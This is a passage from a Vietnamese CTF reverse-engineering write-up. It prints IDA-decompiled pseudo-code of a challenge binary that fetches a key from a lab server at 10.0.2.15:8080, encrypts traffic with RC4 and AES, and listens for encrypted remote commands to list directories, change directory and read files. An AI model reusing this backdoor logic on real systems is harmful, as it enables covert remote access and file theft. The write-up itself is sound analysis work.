<li>Compile bằng MinGW’s gcc 64bit (hầu như sẽ không gọi tới WinAPI quá nhiều - 1 điểm cộng lớn khi reverse binary Windows <img src="/images/Popo/2.webp" width="32" height="32" style="display:inline">.)</li>
</ul>
<h3 id="Phan-tich-bang-IDA"><a href="#Phan-tich-bang-IDA" class="headerlink" title="Phân tích bằng IDA"></a>Phân tích bằng IDA</h3><p>Khi mới đầu load, chương trình sẽ xuất hiện rất nhiều mã <code>int 4</code>, tuy nhiên có thể đay chỉ là interrupt của VMProtect, không ảnh hưởng tới chương trình lắm (thông qua debug), + thêm việc dùng indirect calling cho function, cho nên có thể dùng regex và filter bớt đi, được đoạn code sáng sủa hơn như sau:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br></pre></td><td class="code"><pre><span class="line">  <span class="built_in">memset</span>(v70, <span class="number">0</span>, <span class="number">2048</span>);</span><br><span class="line">  wcscpy(v74, <span class="string">L&quot;key&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !get_request(v74, v70) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  v3 = <span class="built_in">strlen</span>(v70);</span><br><span class="line">  v4 = b64_decode(v70, v3);</span><br><span class="line">  v5 = <span class="built_in">strlen</span>(v4);</span><br><span class="line">  v6 = json_parse(v4, v5);</span><br><span class="line">  <span class="built_in">memset</span>(v70, <span class="number">0</span>, <span class="number">2048</span>);</span><br><span class="line">  v61[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  process_object(v6, <span class="number">1</span>, v70, v61);</span><br><span class="line">  v7 = srand;</span><br><span class="line">  v8 = time(<span class="number">0</span>);</span><br><span class="line">  v7(v8);</span><br><span class="line">  <span class="built_in">memset</span>(v65, <span class="number">0</span>, <span class="number">80</span>);</span><br><span class="line">  <span class="built_in">memset</span>(v71, <span class="number">0</span>, <span class="number">2048</span>);</span><br><span class="line">  v9 = key;</span><br><span class="line">  v61[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  v10 = iv;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v11 = rand();</span><br><span class="line">    v12 = v11;</span><br><span class="line">    wcscpy(v74, <span class="string">L&quot;〥報&quot;</span>);</span><br><span class="line">    text_68(v9, v74, (v11 &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0xF</span>);</span><br><span class="line">    wcscpy(v74, <span class="string">L&quot;〥報&quot;</span>);</span><br><span class="line">    text_68(v9 + <span class="number">1</span>, v74, v12 &amp; <span class="number">0xF</span>);</span><br><span class="line">    v13 = rand();</span><br><span class="line">    v14 = v13;</span><br><span class="line">    wcscpy(v74, <span class="string">L&quot;〥報&quot;</span>);</span><br><span class="line">    text_68(v10, v74, (v13 &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0xF</span>);</span><br><span class="line">    v9 += <span class="number">2</span>;</span><br><span class="line">    wcscpy(v74, <span class="string">L&quot;〥報&quot;</span>);</span><br><span class="line">    v15 = v10 + <span class="number">1</span>;</span><br><span class="line">    v10 += <span class="number">2</span>;</span><br><span class="line">    text_68(v15, v74, v14 &amp; <span class="number">0xF</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v9 != &amp;key[<span class="number">32</span>] );</span><br><span class="line">  mem_concat(key, <span class="number">32</span>, iv, <span class="number">32</span>, v65);</span><br><span class="line">  <span class="built_in">memset</span>(v72, <span class="number">0</span>, <span class="number">2048</span>);</span><br><span class="line">  wmemcpy(v74, <span class="string">L&quot;ᕍ䭈䵓䥝ᵛ慺䍠&quot;</span>, <span class="number">7</span>);</span><br><span class="line">  v16 = v74;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    *v16 ^= <span class="number">54</span> - v74 + v16;</span><br><span class="line">    v16 = (v16 + <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( (&amp;v75 + <span class="number">6</span>) != v16 );</span><br><span class="line">  v17 = <span class="built_in">strlen</span>(v72);</span><br><span class="line">  mem_concat(v72, v17, v74, <span class="number">13</span>, v72);</span><br><span class="line">  v18 = <span class="built_in">strlen</span>(v72);</span><br><span class="line">  mem_concat(v72, v18, v65, <span class="number">64</span>, v72);</span><br><span class="line">  wmemcpy(v74, <span class="string">L&quot;ᬔᬘ告䥎Ԝ灠灰灰䜻&quot;</span>, <span class="number">9</span>);</span><br><span class="line">  v19 = v74;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    *v19 ^= <span class="number">54</span> - v74 + v19;</span><br><span class="line">    v19 = (v19 + <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v19 != (&amp;v76 + <span class="number">2</span>) );</span><br><span class="line">  v20 = <span class="built_in">strlen</span>(v72);</span><br><span class="line">  mem_concat(v72, v20, v74, <span class="number">17</span>, v72);</span><br><span class="line">  v21 = <span class="built_in">strlen</span>(v72);</span><br><span class="line">  rc4(v70, v61[<span class="number">0</span>], v72, v21, v71);</span><br><span class="line">  v22 = <span class="built_in">strlen</span>(v72);</span><br><span class="line">  v23 = <span class="built_in">strlen</span>(user_token);</span><br><span class="line">  mem_concat(user_token, v23, v71, v22, v71);</span><br><span class="line">  v24 = <span class="built_in">strlen</span>(v72);</span><br><span class="line">  v25 = v24 + <span class="built_in">strlen</span>(user_token);</span><br><span class="line">  v26 = b64_encode(v71, v25);</span><br><span class="line">  wcscpy(v74, <span class="string">L&quot;key&quot;</span>);</span><br><span class="line">  v56 = v26;</span><br><span class="line">  <span class="keyword">if</span> ( !post_request(v74, v26, <span class="number">0</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;key_bytes, <span class="number">0</span>, <span class="number">30</span>);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;iv_bytes, <span class="number">0</span>, <span class="number">30</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !string2hex(key, <span class="number">0x20</span>u, &amp;key_bytes) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !string2hex(iv, <span class="number">0x20</span>u, &amp;iv_bytes) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  get_current_dir();</span><br><span class="line">  v28 = <span class="number">54</span> - v74;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(v72, <span class="number">0</span>, <span class="number">2048</span>);</span><br><span class="line">    wmemcpy(v74, <span class="string">L&quot;ᕍ䵋佛义Ԝ捠☰℥政䤵&quot;</span>, <span class="number">10</span>);</span><br><span class="line">    v29 = v74;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      *v29 ^= v28 + v29;</span><br><span class="line">      v29 = (v29 + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v29 != (&amp;v76 + <span class="number">4</span>) );</span><br><span class="line">    v30 = <span class="built_in">strlen</span>(v72);</span><br><span class="line">    mem_concat(v72, v30, v74, <span class="number">19</span>, v72);</span><br><span class="line">    v31 = (<span class="built_in">strlen</span>(v72) &amp; <span class="number">0xFFFFFFF0</span>) + <span class="number">16</span>;</span><br><span class="line">    AES_init_ctx_iv(v66, &amp;key_bytes, &amp;iv_bytes);</span><br><span class="line">    AES_CBC_encrypt_buffer(v66);</span><br><span class="line">    v32 = <span class="built_in">strlen</span>(user_token);</span><br><span class="line">    mem_concat(user_token, v32, v72, v31, v72);</span><br><span class="line">    v33 = <span class="built_in">strlen</span>(user_token);</span><br><span class="line">    v34 = b64_encode(v72, v31 + v33);</span><br><span class="line">    v35 = v74;</span><br><span class="line">    v36 = <span class="number">54</span>;</span><br><span class="line">    wmemcpy(v74, <span class="string">L&quot;TRYZUUcMWQ&#x27;A&quot;</span>, <span class="number">12</span>);</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      *v35++ ^= v36++;</span><br><span class="line">    <span class="keyword">while</span> ( &amp;v77 != v35 );</span><br><span class="line">    <span class="keyword">if</span> ( !post_request(v74, v34, v56) )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(v56, &amp;unk_40F000) )</span><br><span class="line">      assert(<span class="string">&quot;!strcmp(response, \&quot;Ok\&quot;)&quot;</span>, <span class="string">&quot;.\\challenge.c&quot;</span>, <span class="number">126</span>);</span><br><span class="line">    v62 = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">memset</span>(v64, <span class="number">0</span>, <span class="number">48</span>);</span><br><span class="line">    <span class="keyword">if</span> ( WSAStartup(<span class="number">514</span>, v67) )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    wmemcpy(v74, <span class="string">L&quot;ԇഋ㬏&quot;</span>, <span class="number">3</span>);</span><br><span class="line">    v64[<span class="number">0</span>] = <span class="number">0x200000001</span>;</span><br><span class="line">    v64[<span class="number">1</span>] = <span class="number">0x600000001</span>;</span><br><span class="line">    v37 = getaddrinfo;</span><br><span class="line">    v38 = v74;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      *v38 ^= v28 + v38;</span><br><span class="line">      v38 = (v38 + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( &amp;v74[<span class="number">3</span>] != v38 );</span><br><span class="line">    v55 = v37(<span class="number">0</span>, v74, v64, &amp;v62);</span><br><span class="line">    <span class="keyword">if</span> ( v55 )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_39:</span><br><span class="line">      v50 = <span class="number">-1</span>;</span><br><span class="line">      WSACleanup();</span><br><span class="line">      <span class="keyword">return</span> v50;</span><br><span class="line">    &#125;</span><br><span class="line">    v39 = socket(*(v62 + <span class="number">4</span>), *(v62 + <span class="number">8</span>), *(v62 + <span class="number">12</span>));</span><br><span class="line">    v40 = v39;</span><br><span class="line">    <span class="keyword">if</span> ( v39 == <span class="number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v50 = <span class="number">-1</span>;</span><br><span class="line">      freeaddrinfo(v62);</span><br><span class="line">      WSACleanup();</span><br><span class="line">      <span class="keyword">return</span> v50;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( bind(v39, *(v62 + <span class="number">32</span>), *(v62 + <span class="number">16</span>)) == <span class="number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v50 = <span class="number">-1</span>;</span><br><span class="line">      freeaddrinfo(v62);</span><br><span class="line">LABEL_54:</span><br><span class="line">      closesocket(v40);</span><br><span class="line">      WSACleanup();</span><br><span class="line">      <span class="keyword">return</span> v50;</span><br><span class="line">    &#125;</span><br><span class="line">    freeaddrinfo(v62);</span><br><span class="line">    <span class="keyword">if</span> ( listen(v40, <span class="number">0x7FFFFFFF</span>) == <span class="number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v50 = <span class="number">-1</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_54;</span><br><span class="line">    &#125;</span><br><span class="line">    v54 = accept(v40, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v54 == <span class="number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      closesocket(v40);</span><br><span class="line">      WSACleanup();</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    closesocket(v40);</span><br><span class="line">    <span class="built_in">memset</span>(v73, <span class="number">0</span>, <span class="number">4096</span>);</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">memset</span>(v69, <span class="number">0</span>, <span class="number">1048</span>);</span><br><span class="line">      v41 = recv(v54, v69, <span class="number">1048</span>, <span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v41 &lt;= <span class="number">0</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v57 = <span class="built_in">strlen</span>(v69);</span><br><span class="line">      v42 = <span class="built_in">strlen</span>(v73);</span><br><span class="line">      mem_concat(v73, v42, v69, v57, v73);</span><br><span class="line">      <span class="keyword">if</span> ( v69[<span class="built_in">strlen</span>(v69) - <span class="number">1</span>] == <span class="number">10</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_31;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v41 )</span><br><span class="line">    &#123;</span><br><span class="line">      closesocket(v54);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_39;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_31:</span><br><span class="line">    v73[<span class="built_in">strlen</span>(v73) - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    v63 = <span class="number">0</span>;</span><br><span class="line">    v43 = <span class="built_in">strlen</span>(v73);</span><br><span class="line">    v44 = b64_decode_ex(v73, v43, &amp;v63);</span><br><span class="line">    <span class="built_in">memset</span>(v66, <span class="number">0</span>, <span class="number">192</span>);</span><br><span class="line">    AES_init_ctx_iv(v66, &amp;key_bytes, &amp;iv_bytes);</span><br><span class="line">    <span class="built_in">strlen</span>(v73);</span><br><span class="line">    AES_CBC_decrypt_buffer(v66, v44);</span><br><span class="line">    (*v44)[<span class="number">0</span>][v63] = <span class="number">0</span>;</span><br><span class="line">    v45 = <span class="built_in">strlen</span>(v44);</span><br><span class="line">    v58 = json_parse(v44, v45);</span><br><span class="line">    <span class="built_in">memset</span>(v70, <span class="number">0</span>, <span class="number">2048</span>);</span><br><span class="line">    v61[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    process_object(v58, <span class="number">2</span>, v70, v61);</span><br><span class="line">    <span class="built_in">memset</span>(v74, <span class="number">0</span>, <span class="number">4096</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(v68, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">    v46 = <span class="built_in">strcmp</span>(v70, v68);</span><br><span class="line">    <span class="keyword">if</span> ( v46 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">strcpy</span>(v68, <span class="string">&quot;2&quot;</span>);</span><br><span class="line">      v46 = <span class="built_in">strcmp</span>(v70, v68);</span><br><span class="line">      <span class="keyword">if</span> ( v46 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">strcpy</span>(v68, <span class="string">&quot;3&quot;</span>);</span><br><span class="line">        v46 = <span class="built_in">strcmp</span>(v70, v68);</span><br><span class="line">        <span class="keyword">if</span> ( v46 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">strcpy</span>(v68, <span class="string">&quot;4&quot;</span>);</span><br><span class="line">          v46 = <span class="built_in">strcmp</span>(v70, v68);</span><br><span class="line">          <span class="keyword">if</span> ( v46 )</span><br><span class="line">          &#123;</span><br><span class="line">            v46 = <span class="number">0</span>;</span><br><span class="line">            <span class="built_in">strcpy</span>(v68, <span class="string">&quot;5&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v70, v68) )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="built_in">strcpy</span>(v68, <span class="string">&quot;ok&quot;</span>);</span><br><span class="line">              v46 = <span class="number">1</span>;</span><br><span class="line">              <span class="built_in">strcpy</span>(v74, v68);</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            pwd(v74);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v61[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">          <span class="built_in">memset</span>(v68, <span class="number">0</span>, <span class="number">1024</span>);</span><br><span class="line">          process_object(v58, <span class="number">3</span>, v68, v61);</span><br><span class="line">          cat_file(v68, v74);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v61[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">memset</span>(v68, <span class="number">0</span>, <span class="number">1024</span>);</span><br><span class="line">        process_object(v58, <span class="number">3</span>, v68, v61);</span><br><span class="line">        <span class="keyword">if</span> ( cd_dir(v68) )</span><br><span class="line">        &#123;</span><br><span class="line">          qmemcpy(v60, <span class="string">&quot;PVQU__&lt;&quot;</span>, <span class="keyword">sizeof</span>(v60));</span><br><span class="line">          v51 = v60;</span><br><span class="line">          v52 = <span class="built_in">strcpy</span>;</span><br><span class="line">          v53 = <span class="number">54</span>;</span><br><span class="line">          <span class="keyword">do</span></span><br><span class="line">            *v51++ ^= v53++;</span><br><span class="line">          <span class="keyword">while</span> ( v53 != <span class="number">61</span> );</span><br><span class="line">          v52(v74);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">strcpy</span>(v60, <span class="string">&quot;ok&quot;</span>);</span><br><span class="line">          <span class="built_in">strcpy</span>(v74, v60);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">list</span>(v74);</span><br><span class="line">    &#125;</span><br><span class="line">    v47 = (<span class="built_in">strlen</span>(v74) &amp; <span class="number">0xFFFFFFF0</span>) + <span class="number">16</span>;</span><br><span class="line">    <span class="built_in">memset</span>(v66, <span class="number">0</span>, <span class="number">192</span>);</span><br><span class="line">    AES_init_ctx_iv(v66, &amp;key_bytes, &amp;iv_bytes);</span><br><span class="line">    AES_CBC_encrypt_buffer(v66);</span><br><span class="line">    v48 = b64_encode(v74, v47);</span><br><span class="line">    v59 = send;</span><br><span class="line">    v49 = <span class="built_in">strlen</span>(v48);</span><br><span class="line">    <span class="keyword">if</span> ( v59(v54, v48, v49, <span class="number">0</span>) == <span class="number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v50 = <span class="number">1</span>;</span><br><span class="line">      closesocket(v54);</span><br><span class="line">      WSACleanup();</span><br><span class="line">      <span class="keyword">return</span> v50;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( shutdown(v54, <span class="number">1</span>) == <span class="number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      closesocket(v54);</span><br><span class="line">      v50 = <span class="number">1</span>;</span><br><span class="line">      WSACleanup();</span><br><span class="line">      <span class="keyword">return</span> v50;</span><br><span class="line">    &#125;</span><br><span class="line">    closesocket(v54);</span><br><span class="line">    WSACleanup();</span><br><span class="line">    freeaddrinfo(v62);</span><br><span class="line">    <span class="keyword">if</span> ( !v46 )</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">return</span> v55;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>Khúc trên mới nhìn vào thì nó hơi bùi nhùi 1 xíu :)) nma mình sẽ tách từng phần nhỏ ra dễ nói hơn:</p>
<p>P&#x2F;S: Trong lúc làm mình không đổi tên bất cứ biến nào…, và write up này cũng vậy &lt;(“) nên ráng theo dõi tuần tự nhé</p>
<h4 id="Khoi-tao"><a href="#Khoi-tao" class="headerlink" title="Khởi tạo"></a>Khởi tạo</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memset</span>(v70, <span class="number">0</span>, <span class="number">2048</span>);</span><br><span class="line">wcscpy(v74, <span class="string">L&quot;key&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( !get_request(v74, v70) )</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">v3 = <span class="built_in">strlen</span>(v70);</span><br><span class="line">v4 = b64_decode(v70, v3);</span><br><span class="line">v5 = <span class="built_in">strlen</span>(v4);</span><br><span class="line">v6 = json_parse(v4, v5);</span><br><span class="line"><span class="built_in">memset</span>(v70, <span class="number">0</span>, <span class="number">2048</span>);</span><br><span class="line">v61[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">process_object(v6, <span class="number">1</span>, v70, v61);</span><br><span class="line">v7 = srand;</span><br><span class="line">v8 = time(<span class="number">0</span>);</span><br><span class="line">v7(v8);</span><br><span class="line"><span class="built_in">memset</span>(v65, <span class="number">0</span>, <span class="number">80</span>);</span><br><span class="line"><span class="built_in">memset</span>(v71, <span class="number">0</span>, <span class="number">2048</span>);</span><br></pre></td></tr></table></figure>

<p>Hàm <code>get_request</code>: thực hiện GET request đến IP <code>10.0.2.15:8080/</code> + a1, sau đó response sẽ trả về vào a2:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">get_request</span><span class="params">(<span class="keyword">const</span> <span class="keyword">wchar_t</span> *a1, <span class="keyword">char</span> *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v4; <span class="comment">// r12</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// ebp</span></span><br><span class="line">  __int64 v6; <span class="comment">// rax</span></span><br><span class="line">  __int64 v7; <span 